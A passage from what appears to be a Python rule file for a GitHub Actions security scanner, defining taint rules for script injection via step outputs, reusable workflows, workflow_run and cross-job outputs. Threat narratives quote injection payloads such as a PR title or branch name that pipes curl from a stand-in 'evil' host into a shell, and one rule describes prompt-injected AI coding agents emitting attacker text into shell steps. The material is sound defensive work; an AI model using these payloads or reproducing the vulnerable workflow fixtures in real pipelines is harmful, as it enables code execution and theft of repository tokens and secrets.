            # not bash) — the safe consumption pattern.\n"
            (
                "on: [pull_request_target]\n"
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - id: extract\n"
                "        env:\n"
                "          RAW: ${{ github.event.pull_request.title }}\n"
                '        run: echo "title=$RAW" >> $GITHUB_OUTPUT\n'
                "      - if: startsWith(steps.extract.outputs.title, '[release]')\n"
                "        run: ./release.sh\n"
            ),
            # Shallow / multi-hop / github_env — TAINT-GH-001/002/003's\n"
            # responsibility, not this rule.
            (
                "jobs:\n"
                "  build:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          T: ${{ github.event.pull_request.title }}\n"
                '        run: echo "$T"\n'
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step ``extract`` copies the PR title into $RAW, then "
            "writes ``title=$RAW`` to ``$GITHUB_OUTPUT``.  The output "
            "becomes referenceable as "
            "``${{ steps.extract.outputs.title }}``.  A later step "
            "uses that expression inside a ``run:`` line, where the "
            "Actions engine substitutes the value before bash runs.  "
            "The attacker's PR title "
            '``"; curl evil | bash ; #`` is now a literal fragment '
            "of the rendered shell command and executes with the "
            "runner's GITHUB_TOKEN."
        ),
        incidents=[],
    ),
    # ---------------------------------------------------------------------------
    # TAINT-GH-005 — AI coding-agent step output flowing into a shell sink
    # ---------------------------------------------------------------------------
    Rule(
        id="TAINT-GH-005",
        title=("AI agent step output flows into a shell run: block (steps.<agent-id>.outputs.*)"),
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A step whose ``uses:`` points at an AI coding-agent "
            "action (claude-code, aider, openhands, coderabbit, "
            "cursor, ai-review, gpt-pr, ai-code-review, openai-"
            "action, anthropic-action, llm-agent) carries an "
            "``id:`` and a later step references "
            "``${{ steps.<id>.outputs.<name> }}`` inside a shell "
            "``run:`` block. "
            "Same flow shape as TAINT-GH-004 but with the agent as "
            "the source: the agent's declared outputs are "
            "attacker-shaped whenever a prompt-injection payload "
            "reaches the model (via PR body, comment, review, or "
            "the agent's own read tools). The GitHub Actions engine "
            "substitutes the value into the run: text at workflow-"
            "parse time, so the attacker-controlled bytes land "
            "directly in the shell command line — with the "
            "workflow's full GITHUB_TOKEN and any bound secrets. "
            "Provenance chain example: "
            "``agent:anthropics/claude-code-action -> steps.review"
            '.outputs.summary -> echo "${{ steps.review.outputs'
            '.summary }}"``.'
        ),
        pattern=TaintPattern(kind_filter="agent_output"),
        remediation=(
            "Do not feed agent step outputs into a shell ``run:`` "
            "block without validation:\n"
            "\n"
            "1. Have the agent emit a strictly-shaped JSON file "
            "   (``outputs.json``), then consume specific fields via "
            "   ``jq -r '.decision' outputs.json`` after an "
            "   allow-list check.\n"
            "\n"
            "2. Never write agent output to ``$GITHUB_ENV`` or "
            "   ``$GITHUB_OUTPUT`` unconditionally — both pass "
            "   through to downstream shell without escaping.\n"
            "\n"
            "3. Scope the agent's tool surface (``--allowedTools``) "
            "   so the outputs a caller could reasonably receive "
            "   come from a narrow set of pre-approved tools, not "
            "   from a freeform reasoning pass.\n"
            "\n"
            "See AI-GH-014 for the shallow precondition check "
            "(agent action + step-output in shell), and AI-GH-005 / "
            "AI-GH-006 for the prompt-injection-surface side of the "
            "same attack."
        ),
        reference="https://simonwillison.net/2023/May/2/prompt-injection/",
        test_positive=[
            # Agent action with id, downstream echo of its output in a run: block.
            (
                "jobs:\n"
                "  review:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: anthropics/claude-code-action@v1\n"
                "        id: review\n"
                '      - run: echo "${{ steps.review.outputs.summary }}"\n'
            ),
            # Agent CLI via uses: (different keyword), step output consumed.
            (
                "jobs:\n"
                "  triage:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: example-org/ai-review-bot@v2\n"
                "        id: bot\n"
                '      - run: echo "label=${{ steps.bot.outputs.decision }}"\n'
            ),
        ],
        test_negative=[
            # Step output from a non-agent action — TAINT-GH-004 might still
            # catch it if the upstream writes $GITHUB_OUTPUT with tainted
            # data, but TAINT-GH-005 should stay silent.
            (
                "jobs:\n"
                "  label:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/labeler@v5\n"
                "        id: lab\n"
                '      - run: echo "${{ steps.lab.outputs.labels }}"\n'
            ),
            # Agent action but no id — no step-output reference reachable.
            (
                "jobs:\n"
                "  review:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: anthropics/claude-code-action@v1\n"
                "      - run: echo hi\n"
            ),
            # Agent action with id, but no downstream step-output reference.
            (
                "jobs:\n"
                "  review:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: anthropics/claude-code-action@v1\n"
                "        id: review\n"
                "      - run: echo 'done'\n"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR, comment, or review whose body "
            "contains a prompt-injection payload. The AI agent — "
            "via its own read tools — ingests the payload and emits "
            "attacker-chosen text in its declared step outputs. A "
            "downstream ``run:`` that consumes "
            "``${{ steps.review.outputs.X }}`` renders that text "
            "into a shell command line. No taint source in the YAML "
            "itself; the provenance chain starts at the agent "
            "package and ends at bash, the same 'step output as "
            "taint bridge' shape TAINT-GH-004 handles for "
            "``$GITHUB_OUTPUT`` writes."
        ),
        incidents=[],
    ),
    # =========================================================================
    # TAINT-GH-006 — cross-workflow input reference in a reusable workflow
    # =========================================================================
    #
    # A reusable workflow (``on: workflow_call``) receives inputs from its
    # caller. When the caller is a workflow that runs under an attacker-
    # reachable trigger (``pull_request_target``, ``issue_comment``, ...),
    # any ``with: X: ${{ github.event.* }}`` passes attacker bytes into
    # the callee's ``inputs.X`` namespace.
    #
    # This rule fires on the CALLEE side: when a reusable workflow
    # references ``${{ inputs.X }}`` anywhere in its body.  It's a
    # review-needed finding because the author of the reusable workflow
    # cannot know what callers pass; responsibility is shared, and a
    # reviewer has to audit the callers to confirm safety.
    #
    # Scope / caveats:
    #   - Line-level regex, not a full dataflow analysis.  Fires on any
    #     ``${{ inputs.X }}`` reference in a non-schema context.  The
    #     schema-definition block (``inputs:`` under ``workflow_call``)
    #     is excluded — references to inputs inside ``default:`` /
    #     ``description:`` aren't sinks.
    #   - Caller side not tracked here.  A future PR can parse the local
    #     ``.github/workflows/*.yml`` tree to cross-reference which
    #     callers pass which tainted contexts.  Until then, the finding
    #     is a prompt to audit the callers manually.
    Rule(
        id="TAINT-GH-006",
        title="Reusable workflow input reference (caller responsible for safety)",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        # 2026-04-27 audit: route to review-needed. The threat
        # depends on what callers pass through `with:` — info the
        # callee's pattern can't see. The rule's value is to surface
        # input references for caller-side audit, not to claim a
        # confirmed risk. confidence='low' for the same reason.
        review_needed=True,
        confidence="low",
        description=(
            "A reusable workflow (``on: workflow_call``) references "
            "``${{ inputs.X }}``.  The callee author has no way to "
            "know what callers pass — if any caller is reachable from "
            "a fork trigger (``pull_request_target``, "
            "``issue_comment``) and forwards an attacker-controlled "
            "``github.event.*`` into the input, the substituted bytes "
            "land in the callee's execution context with the callee's "
            "permissions.  Review every caller of this workflow to "
            "confirm the input is either a trusted context (SHA, ref, "
            "actor login on a push-only trigger) or properly sanitised."
        ),
        pattern=ContextPattern(
            anchor=r"\$\{\{\s*inputs\.[A-Za-z_][\w-]*\s*\}\}",
            # File must be a reusable workflow. Three legal shapes of
            # ``on: workflow_call``: bare string, flow-style list, or
            # block-style nested key.  The ``\b`` on workflow_call
            # protects against a user-defined event name that
            # contained the substring (none exists today, forward-proof).
            requires=(
                r"(?m)^on:\s*workflow_call\s*(?:#.*)?$"
                r"|^on:\s*\[[^\]]*\bworkflow_call\b"
                r"|^\s+\bworkflow_call\s*:"
            ),
            exclude=[
                # Schema-definition lines — inputs referenced in the
                # declaration block itself aren't shell sinks.
                r"^\s*(?:description|default|type|required)\s*:",
                # Conditionals are evaluated by the Actions engine, not
                # by bash.  Follow the same carve-out the existing
                # TAINT rules apply for ``if:`` lines.
                r"^\s*if\s*:",
                # Structural / inert YAML scalar fields — the engine
                # validates these before any shell sees them:
                #   timeout-minutes  — numeric only, engine rejects non-numeric
                #   concurrency      — grouping key, never reaches a shell
                # Keep ``runs-on:`` / ``container:`` / ``image:`` IN — those
                # do have real threats (self-hosted runner hijack, attacker-
                # controlled container image pull) that belong in the audit.
                r"^\s*(?:timeout-minutes|concurrency)\s*:",
                # Comment-only lines.
                r"^\s*#",
            ],
            scope="file",
        ),
        remediation=(
            "Do one of:\n"
            "\n"
            "1. Force callers to pass only trusted contexts.  Document\n"
            "   the input contract in a workflow-level comment and\n"
            "   audit every caller.  Callers triggered by\n"
            "   ``pull_request_target`` or ``issue_comment`` must NOT\n"
            "   forward ``github.event.pull_request.*``,\n"
            "   ``github.event.issue.*``, ``github.event.comment.*``,\n"
            "   or ``github.head_ref``.\n"
            "\n"
            "2. Copy the input into an env var and reference it as\n"
            "   ``$VAR`` in the shell — that way the Actions engine\n"
            "   doesn't textually substitute into bash:\n"
            "     env:\n"
            "       TITLE: ${{ inputs.title }}\n"
            '     run: echo "$TITLE"\n'
            "   Only marginally safer — still needs caller-side\n"
            "   validation for real protection.\n"
            "\n"
            "3. Restrict ``on:`` to exclude ``workflow_call`` if the\n"
            "   workflow doesn't actually need to be reusable."
        ),
        reference="https://docs.github.com/en/actions/using-workflows/reusing-workflows",
        test_positive=[
            "on: workflow_call\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            '    steps:\n      - run: echo "${{ inputs.version }}"\n',
            "on:\n  workflow_call:\n    inputs:\n      title:\n        type: string\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo ${{ inputs.title }}\n",
        ],
        test_negative=[
            # Not a reusable workflow — inputs.* here can only come
            # from workflow_dispatch, and the scanner opts out of
            # flagging those (they need workflows:write).
            "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            '    steps:\n      - run: echo "${{ inputs.version }}"\n',
            # Reusable workflow, but inputs.X only referenced inside
            # the schema definition (default:).
            "on:\n  workflow_call:\n    inputs:\n      tag:\n"
            "        type: string\n        default: ${{ inputs.fallback }}\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo hi\n",
            # Reusable workflow, input referenced only in an if:
            # conditional — evaluated by the engine, not bash.
            "on: workflow_call\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - if: inputs.debug == 'true'\n"
            "        run: echo debug\n",
            # Reusable workflow, input used only in an inert YAML
            # scalar field (timeout-minutes is numeric-only, engine-
            # validated before any shell sees it).
            "on: workflow_call\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    timeout-minutes: ${{ inputs.timeout }}\n"
            "    steps:\n      - run: echo hi\n",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR against a repository that uses a "
            "``pull_request_target``-triggered caller workflow.  The "
            "caller forwards ``github.event.pull_request.title`` (or "
            "any similar attacker-controlled field) as an input to "
            "this reusable workflow.  The substituted value lands in "
            "a shell ``run:`` with the reusable workflow's full "
            "GITHUB_TOKEN and any secrets declared in the caller's "
            "``with:`` or ``secrets:`` block.  Same injection shape as "
            "SEC4-GH-008, only the taint source crosses a workflow "
            "boundary and so no single-file rule catches it."
        ),
        incidents=[],
    ),
    # =========================================================================
    # TAINT-GH-007 — caller-side cross-workflow taint
    # =========================================================================
    #
    # The other half of TAINT-GH-006.  TAINT-GH-006 fires on the CALLEE
    # when it references ``${{ inputs.X }}``.  This rule fires on the
    # CALLER when the job invokes a local reusable workflow (``uses: ./
    # .github/workflows/X.yml``) *and* references an attacker-controlled
    # ``github.event.*`` context in the same job (typically in the
    # ``with:`` block passing inputs to the reusable workflow).
    #
    # Together the two rules cover the pattern from both sides: a fork-
    # triggered caller that forwards PR title / body / head_ref into
    # the reusable's inputs.  The caller side needs its own rule
    # because a reusable workflow audited in isolation (TAINT-GH-006)
    # tells you "this input could be dangerous" but not "THIS caller is
    # the one sending attacker bytes".  SEC4-GH-004 catches direct
    # ``run:`` injection but explicitly excludes the ``key: ${{ ... }}``
    # YAML-value shape that dominates reusable-workflow ``with:``
    # blocks.
    Rule(
        id="TAINT-GH-007",
        title="Attacker-controlled context passed to reusable workflow (caller-side)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A job invokes a local reusable workflow (``uses: ./.github/"
            "workflows/*.yml``) and, in the same job, references an "
            "attacker-controlled GitHub context (PR title, body, "
            "head_ref, issue body, comment body, commit message).  "
            "The ``with:`` block passes the substituted value into the "
            "reusable workflow's ``inputs.*`` namespace — where "
            "TAINT-GH-006 surfaces the reference on the callee side.  "
            "If the caller's triggering event is fork-reachable "
            "(``pull_request_target``, ``issue_comment``, ...), the "
            "attacker-controlled bytes land in the reusable workflow's "
            "execution context with the reusable's GITHUB_TOKEN and "
            "any secrets the caller forwards."
        ),
        pattern=ContextPattern(
            # Attacker-controlled GitHub contexts.  Kept in sync with
            # SEC4-GH-004 and the _TAINTED_CONTEXTS list in
            # taintly/taint.py.
            #
            # Intentionally does NOT include ``pull_request.head.sha``
            # or ``pull_request.base.sha`` — those are immutable git
            # hashes, not attacker-controllable strings.  The branch
            # NAME (``head.ref`` / ``head_ref``) IS attacker-
            # controllable and stays in.
            anchor=(
                r"\$\{\{\s*github\.(event\.(issue\.(title|body)"
                r"|pull_request\.(title|body|head\.ref|user\.login)"
                r"|comment\.body|review\.body"
                r"|head_commit\.(message|author\.(email|name)))"
                r"|head_ref)"
            ),
            # Same job must invoke a local reusable workflow.  Remote
            # reusables (``uses: org/repo/.github/workflows/x.yml@ref``)
            # are a distinct threat model and out of scope for this
            # first cut — local-only keeps the signal high.
            requires=r"uses:\s+\./\.github/workflows/[\w/.-]+\.ya?ml",
            exclude=[
                # Comment-only lines.
                r"^\s*#",
                # ``if:`` conditionals are engine-evaluated, not bash.
                r"^\s*if\s*:",
                # ``run:`` lines are caught by SEC4-GH-004 already; keep
                # this rule focused on the ``with:`` / non-run pathway.
                r"^\s*run\s*:",
            ],
            scope="job",
        ),
        remediation=(
            "Don't forward attacker-controlled context into a "
            "reusable workflow.  Sanitise at the caller:\n"
            "\n"
            "1. Pin the reusable to a SHA and pass only trusted\n"
            "   contexts (SHA, ref from ``github.event.workflow_run``\n"
            "   on a push-only upstream, static strings).\n"
            "\n"
            "2. If the reusable truly needs PR metadata, copy into\n"
            "   an env var first and sanitise (e.g. allowlist-regex)\n"
            "   before passing:\n"
            "     jobs:\n"
            "       validate:\n"
            "         runs-on: ubuntu-latest\n"
            "         outputs:\n"
            "           safe_title: ${{ steps.check.outputs.t }}\n"
            "         steps:\n"
            "           - id: check\n"
            "             env:\n"
            "               RAW: ${{ github.event.pull_request.title }}\n"
            "             run: |\n"
            '               [[ "$RAW" =~ ^[A-Za-z0-9._\\ -]+$ ]] '
            "|| { echo '::error::bad title'; exit 1; }\n"
            '               echo "t=$RAW" >> $GITHUB_OUTPUT\n'
            "       call:\n"
            "         needs: validate\n"
            "         uses: ./.github/workflows/build.yml\n"
            "         with:\n"
            "           title: ${{ needs.validate.outputs.safe_title }}\n"
            "\n"
            "3. Trigger the reusable from ``workflow_run`` instead of\n"
            "   ``pull_request_target`` — the upstream push-only\n"
            "   workflow already validated the PR, so attacker bytes\n"
            "   can't reach the reusable directly."
        ),
        reference=(
            "https://docs.github.com/en/actions/using-workflows/"
            "reusing-workflows#passing-inputs-and-secrets-to-a-reusable-workflow"
        ),
        test_positive=[
            # Canonical pull_request_target caller passing PR title
            # into a local reusable workflow.
            "on: pull_request_target\n"
            "jobs:\n"
            "  call:\n"
            "    uses: ./.github/workflows/build.yml\n"
            "    with:\n"
            "      title: ${{ github.event.pull_request.title }}\n",
            # head_ref variant (Ultralytics December 2024 shape).
            "on: pull_request_target\n"
            "jobs:\n"
            "  call:\n"
            "    uses: ./.github/workflows/deploy.yml\n"
            "    with:\n"
            "      ref: ${{ github.head_ref }}\n",
        ],
        test_negative=[
            # Reusable called with a trusted context (workflow SHA) —
            # no attacker surface.
            "jobs:\n"
            "  call:\n"
            "    uses: ./.github/workflows/build.yml\n"
            "    with:\n"
            "      ref: ${{ github.sha }}\n",
            # Tainted context exists in the file but in a DIFFERENT
            # job from the reusable call — scope=job keeps them
            # separate.
            "jobs:\n"
            "  log:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            '      - run: echo "${{ github.event.pull_request.title }}"\n'
            "  call:\n"
            "    uses: ./.github/workflows/build.yml\n"
            "    with:\n"
            "      ref: ${{ github.sha }}\n",
            # Caller references a remote reusable (``org/repo/...``)
            # — out of scope for this rule.
            "jobs:\n"
            "  call:\n"
            "    uses: org/repo/.github/workflows/build.yml@v1\n"
            "    with:\n"
            "      title: ${{ github.event.pull_request.title }}\n",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR whose title is "
            '``"; curl evil.sh | sh ; #``.  The caller workflow '
            "runs on ``pull_request_target`` and calls "
            "``./.github/workflows/build.yml`` with "
            "``title: ${{ github.event.pull_request.title }}``.  The "
            "reusable workflow references ``${{ inputs.title }}`` in "
            "a ``run:`` block (TAINT-GH-006 would flag that on the "
            "callee side).  The substituted bytes execute in the "
            "reusable workflow's job with the reusable's "
            "GITHUB_TOKEN and any forwarded secrets.  Same Ultralytics-"
            "December-2024 injection shape, but the taint crosses a "
            "workflow boundary so SEC4-GH-004 alone cannot catch it."
        ),
        incidents=["Ultralytics December 2024"],
    ),
    # =========================================================================
    # TAINT-GH-008 — workflow_run event taint
    # =========================================================================
    #
    # ``on: workflow_run`` workflows run after a different workflow finishes
    # and inherit ``github.event.workflow_run.*`` context describing the
    # upstream run.  Several fields are attacker-controllable whenever the
    # upstream workflow is itself fork-triggerable (``pull_request``,
    # ``pull_request_target``) — most notably ``head_branch`` (the PR
    # source branch name), ``head_commit.message`` / ``author.*``, and
    # ``head_repository.*`` (fork metadata).
    #
    # Unlike ``pull_request_target``, ``workflow_run`` is commonly used as
    # a "safer" pattern to approve PRs — so the attacker path is easily
    # overlooked.  If the workflow references any of these fields inside a
    # shell ``run:`` or embeds them into a YAML value that reaches one,
    # the upstream attacker can inject commands with the downstream
    # workflow's full GITHUB_TOKEN (commonly elevated because the author
    # thought workflow_run was safe).
    #
    # Scope: file-level reference detection.  Full taint-flow tracking
    # into env + run sinks is deferred — this rule surfaces "attacker-
    # controlled workflow_run field is textually referenced in a
    # workflow_run-triggered workflow".  The existing SEC4-GH-004 /
    # TAINT-GH-001..004 rules will also fire on the downstream sink, so
    # the two together form a tighter signal.
    Rule(
        id="TAINT-GH-008",
        title="workflow_run handler references attacker-controlled upstream context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A workflow triggered by ``on: workflow_run`` references a "
            "``github.event.workflow_run.*`` field that carries attacker-"
            "controllable bytes when the upstream workflow was fork-"
            "triggerable: ``head_branch`` (PR source branch name), "
            "``head_commit.message`` / ``author.name`` / ``author.email`` "
            "(commit message + signer), and ``head_repository.name`` / "
            "``full_name`` / ``html_url`` / ``description`` (fork "
            "metadata).  ``workflow_run`` handlers commonly have elevated "
            "``GITHUB_TOKEN`` permissions because the author assumed "
            "``workflow_run`` was 'safe' — making any injection path "
            "high-impact.  Trivy's March 2026 advisory chain involved "
            "this pattern."
        ),
        pattern=ContextPattern(
            # Attacker-controllable workflow_run fields. Intentionally
            # excludes ``head_sha`` and ``head_repository.owner.login``
            # — both are immutable identifiers (git SHA / username).
            anchor=(
                r"\$\{\{\s*github\.event\.workflow_run\."
                r"(head_branch|head_commit\.(message|author\.(name|email))"
                r"|head_repository\.(name|full_name|html_url|description))"
            ),
            # File must be a workflow_run handler.  All three legal shapes
            # of ``on:`` are covered.
            requires=(
                r"(?m)^on:\s*workflow_run\s*(?:#.*)?$"
                r"|^on:\s*\[[^\]]*\bworkflow_run\b"
                r"|^\s+\bworkflow_run\s*:"
            ),
            exclude=[
                r"^\s*#",
                r"^\s*if\s*:",
                # concurrency.group is an engine-internal locking key,
                # never substituted into a shell.  Pattern matches
                # ``  group: ...`` lines under a ``concurrency:`` block.
                r"^\s*group\s*:",
                # name: of a workflow / job / step is a display string
                # the Actions UI renders; not a shell sink.
                r"^\s*name\s*:",
            ],
            scope="file",
        ),
        remediation=(
            "Treat ``workflow_run`` handlers as potentially-hostile.  Two\n"
            "reliable mitigations:\n"
            "\n"
            "1. Copy attacker-controllable fields into env vars at step\n"
            "   boundary and reference as ``$VAR`` in shell — the\n"
            "   Actions engine substitutes into env, not into the\n"
            "   shell command line:\n"
            "     env:\n"
            "       HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}\n"
            "     run: |\n"
            '       [[ "$HEAD_BRANCH" =~ ^[A-Za-z0-9._/-]+$ ]] '
            "|| exit 1\n"
            '       echo "$HEAD_BRANCH"\n'
            "\n"
            "2. Validate ``event.workflow_run.conclusion == 'success'``\n"
            "   AND ``event.workflow_run.event`` so the handler only\n"
            "   runs for trusted upstream triggers (e.g. only ``push``\n"
            "   on default branch, never ``pull_request``).\n"
            "\n"
            "3. If the handler needs to read PR metadata, fetch via\n"
            "   ``gh api`` after the upstream SHA has been pinned, so\n"
            "   attackers can't race-condition the upstream run.\n"
            "\n"
            "Best practice guide: Trivy advisory March 2026 and the\n"
            "GitHub Security Lab writeup on workflow_run hardening."
        ),
        reference=(
            "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
        ),
        test_positive=[
            # head_branch embedded directly in a run: line.
            "on:\n  workflow_run:\n    workflows: [CI]\n    types: [completed]\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo ${{ github.event.workflow_run.head_branch }}\n",
            # Commit message reference.
            "on: workflow_run\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: |\n"
            '          echo "${{ github.event.workflow_run.head_commit.message }}"\n',
        ],
        test_negative=[
            # Workflow is triggered by push, not workflow_run — rule
            # scope excludes it even though the field is referenced.
            "on: push\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo ${{ github.event.workflow_run.head_branch }}\n",
            # workflow_run handler but references only immutable
            # head_sha — not attacker-controllable.
            "on: workflow_run\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo ${{ github.event.workflow_run.head_sha }}\n",
            # workflow_run handler, attacker-surface field referenced
            # only in an if: conditional (engine-evaluated, not bash).
            "on: workflow_run\n"
            "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
            "    if: github.event.workflow_run.head_branch == 'main'\n"
            "    steps:\n      - run: echo hi\n",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker opens a PR with a branch named "
            "``;curl evil.sh|sh;#``.  An upstream ``pull_request`` "
            "workflow builds on the PR head, logs results, and "
            "completes.  A ``workflow_run`` handler fires on that "
            "completion and references "
            "``${{ github.event.workflow_run.head_branch }}`` in a "
            "``run:`` block — with elevated GITHUB_TOKEN permissions "
            "the author thought were safe because the handler "
            "'doesn't check out PR code'.  The attacker's branch "
            "name executes as a shell command."
        ),
        incidents=["Trivy March 2026"],
    ),
    # =========================================================================
    # TAINT-GH-009 — cross-job needs.<j>.outputs.<n> taint propagation
    # =========================================================================
    #
    # The cross-job analog of TAINT-GH-004.  A producer job declares
    # ``outputs:`` whose values trace back to an attacker-controlled
    # context (directly, or through env / step-output chains inside the
    # producer).  A consumer job that ``needs:`` the producer
    # interpolates the value via ``${{ needs.<j>.outputs.<n> }}`` —
    # either directly inside ``run:`` or by laundering it through env
    # vars first.  Same server-side substitution semantics as step
    # outputs, just one level up the workflow's job DAG.
    Rule(
        id="TAINT-GH-009",
        title=(
            "Attacker-controlled context flows across jobs via "
            "needs.<job>.outputs.<name> into a shell run: block"
        ),
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A producer job's declared ``outputs:`` block exposes a "
            "value derived from an attacker-controlled GitHub context "
            "(``github.event.pull_request.title``, ``github.head_ref``, "
            "issue / comment / review bodies, ...).  A consumer job "
            "that ``needs:`` the producer references the value via "
            "``${{ needs.<j>.outputs.<n> }}`` — either inlined into a "
            "``run:`` line, or laundered through one or more env "
            "assignments before reaching the shell.  GitHub Actions "
            "interpolates the producer's output into the consumer's "
            "run text at workflow-parse time, so the attacker bytes "
            "land directly in the shell command line with the consumer "
            "job's full GITHUB_TOKEN and bound secrets.  This is the "
            "cross-job analog of TAINT-GH-004 and the dominant shape "
            "behind real-world incidents that chain through multiple "
            "jobs (Ultralytics-class).  The consumer often runs at "
            "elevated privilege (release / publish / IaC apply) "
            "precisely because the producer's job was scoped down, "
            "making the attack worse, not better."
        ),
        pattern=TaintPattern(kind_filter="cross_job"),
        remediation=(
            "Treat every ``needs.<j>.outputs.<n>`` as untrusted "
            "data:\n"
            "\n"
            "1. Don't interpolate the output directly in ``run:``. "
            "   Bind it to a quoted env var first and reference the "
            "   variable, never the substitution:\n"
            "\n"
            "       env:\n"
            '         RAW: "${{ needs.produce.outputs.summary }}"\n'
            '       run: ./tool "$RAW"\n'
            "\n"
            "2. Validate at the producer's outputs: boundary instead "
            "   of the consumer's sink — strip / allow-list / hash "
            "   the value before it leaves the producer job, so every "
            "   downstream consumer inherits the safe shape:\n"
            "\n"
            "       outputs:\n"
            "         safe_title: ${{ steps.validate.outputs.safe }}\n"
            "       steps:\n"
            "         - id: validate\n"
            "           env:\n"
            "             RAW: ${{ github.event.pull_request.title }}\n"
            "           run: |\n"
            '             SAFE=$(printf "%s" "$RAW" | tr -dc "[:alnum:]_- ")\n'
            '             echo "safe=$SAFE" >> $GITHUB_OUTPUT\n'
            "\n"
            "3. If the producer must forward raw attacker bytes (e.g. "
            "   to a downstream tool that handles untrusted input), "
            "   ensure the consumer never reaches ``run:`` — pass via "
            "   ``with:`` to an action that consumes typed inputs, "
            "   not via shell.  See TAINT-GH-006/007 for the "
            "   ``workflow_call`` analog of this discipline."
        ),
        reference="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
        test_positive=[
            # Direct cross-job sink: consumer job inlines the producer's
            # output into a run: line.
            (
                "on: pull_request_target\n"
                "jobs:\n"
                "  produce:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      title: ${{ github.event.pull_request.title }}\n"
                "    steps:\n"
                "      - run: echo hi\n"
                "  consume:\n"
                "    needs: produce\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "${{ needs.produce.outputs.title }}"\n'
            ),
            # Producer goes via step output, consumer via env-mediated
            # multi-hop — same flow, longer chain.
            (
                "on: issue_comment\n"
                "jobs:\n"
                "  produce:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      body: ${{ steps.x.outputs.body }}\n"
                "    steps:\n"
                "      - id: x\n"
                "        env:\n"
                "          RAW: ${{ github.event.comment.body }}\n"
                '        run: echo "body=$RAW" >> $GITHUB_OUTPUT\n'
                "  consume:\n"
                "    needs: produce\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          B: ${{ needs.produce.outputs.body }}\n"
                '        run: echo "$B"\n'
            ),
            # Transitive: A -> B -> C, attacker bytes survive two hops.
            (
                "on: pull_request_target\n"
                "jobs:\n"
                "  a:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      x: ${{ github.event.pull_request.body }}\n"
                "    steps: [{ run: 'echo hi' }]\n"
                "  b:\n"
                "    needs: a\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      y: ${{ needs.a.outputs.x }}\n"
                "    steps: [{ run: 'echo hi' }]\n"
                "  c:\n"
                "    needs: b\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "${{ needs.b.outputs.y }}"\n'
            ),
        ],
        test_negative=[
            # Consumer references producer's output but the producer's
            # output is a static literal, not attacker-controlled.
            (
                "on: pull_request_target\n"
                "jobs:\n"
                "  produce:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      tag: v1.2.3\n"
                "    steps:\n"
                "      - run: echo hi\n"
                "  consume:\n"
                "    needs: produce\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                '      - run: echo "${{ needs.produce.outputs.tag }}"\n'
            ),
            # Producer takes attacker bytes but consumer never references
            # the output — flow is incomplete.
            (
                "on: pull_request_target\n"
                "jobs:\n"
                "  produce:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      title: ${{ github.event.pull_request.title }}\n"
                "    steps:\n"
                "      - run: echo hi\n"
                "  consume:\n"
                "    needs: produce\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: echo nothing\n"
            ),
            # Consumer references producer's output, but only inside
            # single quotes — bash does not interpolate, so there's no
            # shell sink (analyzer treats this as the inline-template
            # substitution which still happens server-side; we
            # intentionally still flag the inline form because GitHub
            # substitutes BEFORE bash sees the line, and a `'` doesn't
            # protect against an embedded `'` in the title).
            #
            # Therefore THIS one stays in test_positive territory if we
            # ever want to demonstrate the literal-vs-substitution gap;
            # the negative case here is a producer that outputs only
            # ``github.run_id`` (not attacker-controlled).
            (
                "on: pull_request_target\n"
                "jobs:\n"
                "  produce:\n"
                "    runs-on: ubuntu-latest\n"
                "    outputs:\n"
                "      rid: ${{ github.run_id }}\n"
                "    steps:\n"
